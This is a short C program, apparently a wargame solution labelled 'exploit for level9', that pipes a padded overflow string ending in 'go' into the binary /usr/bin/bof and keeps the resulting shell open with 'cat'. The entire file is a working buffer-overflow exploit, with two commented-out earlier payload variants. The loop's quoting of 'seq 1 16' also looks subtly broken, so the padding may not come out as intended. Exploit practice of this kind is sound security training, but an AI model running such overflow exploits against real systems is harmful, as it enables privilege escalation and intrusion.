/*
 * Author : superdk@hanmail.net
 * DATA : exploit for level9
 * LICENSE : GNU License
 */

#include <stdio.h>

#define VICTIM "/usr/bin/bof"
#define DEFAULT_BUFFER_SIZE 100
char cmdBuf[DEFAULT_BUFFER_SIZE];

int main( )
{
	//sprintf(cmdBuf, "(printf \"AAAAAAAAAABBBBBBgo\"; cat ) | %s", VICTIM);
	//sprintf(cmdBuf, "(printf \"AAAAAAAAAABBBBBB\\x67\\x6f\"; cat ) | %s", VICTIM);
	sprintf(cmdBuf, "(for i in 'seq 1 16'; do printf \"A\"; done; printf \"go\"; cat ) | %s", VICTIM);
	system(cmdBuf);
	return 0;
}